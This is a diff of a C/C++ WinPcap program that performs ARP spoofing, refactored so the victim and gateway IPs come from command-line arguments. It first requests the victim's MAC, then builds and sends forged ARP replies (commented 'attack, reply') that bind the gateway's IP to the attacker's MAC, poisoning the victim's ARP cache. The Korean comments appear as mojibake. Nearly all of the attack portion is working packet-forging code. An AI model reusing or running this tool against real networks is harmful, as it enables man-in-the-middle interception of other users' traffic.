@@ -18,14 +18,6 @@
 #define ETHERTYPE_ARP 0x0806
 #define ARP_LEN 42
 
-//targetÀº, ½ÇÁ¦·Î Å×ÀÌºí¿¡¼­ º¯Á¶ÇÏ°íÀÚ ÇÏ´Â ³»¿ë. (°ÔÀÌÆ®¿şÀÌip, ³»mac)
-uint8_t target_mac[MAC_LEN] = {};// 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };		//attacker's mac address
-uint8_t target_ip[IPV4_LEN] = {};// 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//gateway ip address
-uint8_t destination_mac[MAC_LEN] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//victim mac, ¿ä°Ç Á÷Á¢ ±¸ÇØ¾ßµÊ
-uint8_t destination_ip[IPV4_LEN] = { 0, 0, 0, 0 };								//victim ip
-
-using namespace std;
-
 typedef struct ethernet_header {
 	unsigned char dest[MAC_LEN];
 	unsigned char sour[MAC_LEN];
@@ -44,19 +36,34 @@ typedef struct arp_header {
 }ARP_HDR;
 typedef struct ipv4_header {
 	unsigned char ip_header_len : 4;	//4bit
-	unsigned char ip_ver:4;				//4bit
+	unsigned char ip_ver : 4;				//4bit
 	unsigned char ip_tos;	//type of service
 	unsigned short ip_total_length;	//total ip length, no ethernet header
 	unsigned short ip_pid;	//packet id
 
-	unsigned char ip_frag_offset;	//fragmentedµÈ ÆĞÅ¶ÀÏ °æ¿ì, ÀÌ°Ô ¸î ¹øÂ°ÀÎÁö?
+	unsigned char ip_frag_offset;	//fragmentedëœ íŒ¨í‚·ì¼ ê²½ìš°, ì´ê²Œ ëª‡ ë²ˆì§¸ì¸ì§€?
 	unsigned char ip_ttl;	//time to live
 	unsigned char ip_protocol;	//ip protocol
-	//TCP 0x06, UDP 0x11
+								//TCP 0x06, UDP 0x11
 	unsigned short ip_checksum;
 	unsigned int ip_srcaddr;
 	unsigned int ip_destaddr;
 }IPV4_HDR;
+
+//targetì€, ì‹¤ì œë¡œ í…Œì´ë¸”ì—ì„œ ë³€ì¡°í•˜ê³ ì í•˜ëŠ” ë‚´ìš©. (ê²Œì´íŠ¸ì›¨ì´ip, ë‚´mac)
+uint8_t target_mac[MAC_LEN];// { 0xcc, 0x2f, 0x71, 0x59, 0x64, 0x74 };		//attacker's mac address
+uint8_t target_ip[IPV4_LEN];// { 192, 168, 43, 1 };//{ 192, 168, 43, 97 };	//gateway ip address
+uint8_t destination_mac[MAC_LEN];// = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };		//victim mac, ìš”ê±´ ì§ì ‘ êµ¬í•´ì•¼ë¨
+uint8_t destination_ip[IPV4_LEN];// = { 0, 0, 0, 0 };							//victim ip
+
+
+ETHER_HDR eth;
+ARP_HDR arp;
+unsigned char packet[1500];	//maximum size if 1500
+char interfaceName[100];
+int packet_idx = 0;
+
+using namespace std;
 
 void ipParser(char* ip, uint8_t* destination_ip) {
 	char* ptr = ip;
@@ -84,20 +91,51 @@ void printPacket(unsigned char* packet, int packet_size) {
 	printf("%02x ", packet[i]);
 	}
 }
+int arpReqGetmac(pcap_t* fp) {
+	for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
+		eth.sour[i] = target_mac[i];
+		eth.dest[i] = 0xff;
+		arp.send_mac[i] = target_mac[i];	//target macëŠ” gatewayì¸ì²™ pretendingí•˜ëŠ” macì£¼ì†Œë¡œ, attackerì˜ macì´ë‹¤.
+		arp.recv_mac[i] = 0x00;
+	}
+	eth.type = htons(ETHERTYPE_ARP);
 
-int _tmain(int argc, _TCHAR* argv[]) {
+	memcpy(packet, &eth, sizeof(eth));
+	packet_idx += sizeof(eth);
+
+	arp.type = htons(ETHERTYPE);			//ethernet type
+	arp.protocol_type = htons(ETHERTYPE_IP);
+	arp.hrdAddr = MAC_LEN;					//hardware size. ì—¬ê¸°ì„œ hardwareëŠ” macì£¼ì†Œë¥¼ ì“´ë‹¤.
+	arp.prtAddr = IPV4_LEN;					//protocol size. ì—¬ê¸°ì„œ ipv4í”„ë¡œí† ì½œì„ ì“°ê³ , ë‹¹ì—°íˆ ì£¼ì†ŒëŠ” ipì´ë‹¤.
+	arp.opcode = htons(0x0001);	//request
+	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
+		arp.send_ip[i] = target_ip[i];		//actual my ip, ëŒ€ì¶©ì¨ë„ ëœë‹¤ë”ë¼
+		arp.recv_ip[i] = destination_ip[i];	//victim ip
+	}
+
+	memcpy(packet + packet_idx, &arp, sizeof(arp));
+	packet_idx += sizeof(arp);
+	printPacket(packet, packet_idx);
+	if (pcap_sendpacket(fp, packet, ARP_LEN)) {
+		fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
+		return -1;
+	}
+	return 1;
+}
+
+
+int main(int argc, char* argv[]) {
 	pcap_if_t* alldevs;
-	//findalldevs Á¤º¸ https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
+	//findalldevs ì •ë³´ https://www.winpcap.org/docs/docs_412/html/structpcap__if.html
 	int inum;	int i = 0;
 	pcap_t* fp;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	unsigned char packet[1500];	//maximum size if 1500
 	if (pcap_findalldevs(&alldevs, errbuf) == -1) {
 		fprintf(stderr, "Error to find devices: %s\n", errbuf);
 		exit(1);
 	}
 
-	//pcap_t ±¸Á¶Ã¼ Á¤º¸ https://blog.silnex.kr/libpcapstruct-pcap_t/
+	//pcap_t êµ¬ì¡°ì²´ ì •ë³´ https://blog.silnex.kr/libpcapstruct-pcap_t/
 	for (pcap_if_t* dev = alldevs; dev; dev = dev->next) {
 		printf("%d. %s", ++i, dev->name);
 		if (dev->description)
@@ -123,9 +161,9 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	i = 0;
 	pcap_if_t* dev = alldevs;
 	for ( ; i < inum - 1; dev = dev->next, i++);
-	//list ¼øÈ¸ÇÏ¿© ¼±ÅÃµÈ interface·Î ³Ñ¾î°¨.
+	//list ìˆœíšŒí•˜ì—¬ ì„ íƒëœ interfaceë¡œ ë„˜ì–´ê°.
 
-	//pcap_open_live, fp Á¤º¸ https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
+	//pcap_open_live, fp ì •ë³´ https://wiki.kldp.org/KoreanDoc/html/Libpcap-KLDP/function.html
 	fp = pcap_open_live(dev->name, USHRT_MAX + 1, 0, 1000, errbuf);
 	//device name, capturing size, promiscuous mode, read timeout, error buffer
 	if (!fp) {
@@ -133,15 +171,26 @@ int _tmain(int argc, _TCHAR* argv[]) {
 		return -1;
 	}
 	
+//--------------------------------------------------------------------------------------------------------------------------
+
 	memset(packet, 0, sizeof(packet));
-	ETHER_HDR eth;
-	ARP_HDR arp;
-	int packet_idx = 0;
+
 	char mac[30];
 	char ip[30];
+	memset(ip, 0, sizeof(ip));
 	
-	//set destination ip
-	printf("Input the victim ip address in this form (192.168.43.97): ");
+	//mydevice
+	//{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}
+	//name, destination_ip, target_ip
+	strncpy(interfaceName, argv[1], strlen(argv[1]));
+	strncpy(ip, argv[2], strlen(argv[2]));
+	ipParser(ip, destination_ip);
+	memset(ip, 0, sizeof(ip));
+
+	strncpy(ip, argv[3], strlen(argv[3]));
+	ipParser(ip, target_ip);
+
+/*	printf("Input the victim ip address in this form (192.168.43.97): ");
 	scanf("%20s", ip);
 	fflush(stdin);
 	ipParser(ip, destination_ip);
@@ -153,41 +202,16 @@ int _tmain(int argc, _TCHAR* argv[]) {
 	ipParser(ip, target_ip);
 
 	//set source mac
-	macParser(getMyMac("{6EF37E61-C314-41AB-BCCC-F1D5F1C3EAFA}"), target_mac);//³» ip Á÷Á¢ ±¸ÇÏ±â
+
+*/
 
 	//get destination mac
-		{
-			for (int i = 0; i < MAC_LEN; i++) {		//mac of ethernet, arp header
-				eth.sour[i] = target_mac[i];
-				eth.dest[i] = 0xff;
-				arp.send_mac[i] = target_mac[i];	//target mac´Â gatewayÀÎÃ´ pretendingÇÏ´Â macÁÖ¼Ò·Î, attackerÀÇ macÀÌ´Ù.
-				arp.recv_mac[i] = 0x00;
-			}
-			eth.type = htons(ETHERTYPE_ARP);
-
-			memcpy(packet, &eth, sizeof(eth));
-			packet_idx += sizeof(eth);
-
-			arp.type = htons(ETHERTYPE);			//ethernet type
-			arp.protocol_type = htons(ETHERTYPE_IP);
-			arp.hrdAddr = MAC_LEN;					//hardware size. ¿©±â¼­ hardware´Â macÁÖ¼Ò¸¦ ¾´´Ù.
-			arp.prtAddr = IPV4_LEN;					//protocol size. ¿©±â¼­ ipv4ÇÁ·ÎÅäÄİÀ» ¾²°í, ´ç¿¬È÷ ÁÖ¼Ò´Â ipÀÌ´Ù.
-			arp.opcode = htons(0x0001);	//request
-			for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
-				arp.send_ip[i] = target_ip[i];		//actual my ip, ´ëÃæ½áµµ µÈ´Ù´õ¶ó
-				arp.recv_ip[i] = destination_ip[i];	//victim ip
-			}
-
-			memcpy(packet + packet_idx, &arp, sizeof(arp));
-			packet_idx += sizeof(arp);
-			printPacket(packet, packet_idx);
-			if (pcap_sendpacket(fp, packet, ARP_LEN)) {
-				fprintf(stderr, "\nError sending the packet: \n", pcap_geterr(fp));
-				return -1;
-			}
-		}
+	macParser(getMyMac(interfaceName), target_mac);//ë‚´ ip ì§ì ‘ êµ¬í•˜ê¸°
+	arpReqGetmac(fp);
+	
 
 //----------------------------------------------------------------------------------------------------------------
+
 	memset(&eth, 0, sizeof(eth));
 	memset(&arp, 0, sizeof(arp));
 	memset(&packet, 0, sizeof(packet));
@@ -204,9 +228,9 @@ int _tmain(int argc, _TCHAR* argv[]) {
 			printf("ARP return isn't captured\n\n");
 			exit(-1);
 		}
-		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARPÆĞÅ¶ÀÎÁö È®ÀÎ
-			if (!strncmp((const char*)destination_ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31ÀÌ victim ip¿Í °°ÀºÁö È®ÀÎ
-				//printPacket((unsigned char*)temp, ARP_LEN);								//22 ~ 27 mac µû±â
+		if (temp[12] == 0x08 && temp[13] == 0x06) {											//ARPíŒ¨í‚·ì¸ì§€ í™•ì¸
+			if (!strncmp((const char*)destination_ip, (const char*)temp + 28, IPV4_LEN)) {	//28 ~ 31ì´ victim ipì™€ ê°™ì€ì§€ í™•ì¸
+				//printPacket((unsigned char*)temp, ARP_LEN);								//22 ~ 27 mac ë”°ê¸°
 				strncpy((char*)destination_mac, (char*)temp + 22, MAC_LEN);
 				printf("\n\n");
 				break;
@@ -230,11 +254,11 @@ int _tmain(int argc, _TCHAR* argv[]) {
 
 	arp.type = htons(ETHERTYPE);			//ethernet type
 	arp.protocol_type = htons(ETHERTYPE_IP);
-	arp.hrdAddr = MAC_LEN;					//hardware size. ¿©±â¼­ hardware´Â macÁÖ¼Ò¸¦ ¾´´Ù.
-	arp.prtAddr = IPV4_LEN;					//protocol size. ¿©±â¼­ ipv4ÇÁ·ÎÅäÄİÀ» ¾²°í, ´ç¿¬È÷ ÁÖ¼Ò´Â ipÀÌ´Ù.
+	arp.hrdAddr = MAC_LEN;					//hardware size. ì—¬ê¸°ì„œ hardwareëŠ” macì£¼ì†Œë¥¼ ì“´ë‹¤.
+	arp.prtAddr = IPV4_LEN;					//protocol size. ì—¬ê¸°ì„œ ipv4í”„ë¡œí† ì½œì„ ì“°ê³ , ë‹¹ì—°íˆ ì£¼ì†ŒëŠ” ipì´ë‹¤.
 	arp.opcode = htons(0x0002);	//attack, reply
 	for (int i = 0; i < IPV4_LEN; i++) {	//ip of arp
-		arp.send_ip[i] = target_ip[i];		//arp¿¡¼± source ip°¡ pretending ip(gateway)ÀÌ´Ù.
+		arp.send_ip[i] = target_ip[i];		//arpì—ì„  source ipê°€ pretending ip(gateway)ì´ë‹¤.
 		arp.recv_ip[i] = destination_ip[i];	//victim ip
 	}
 
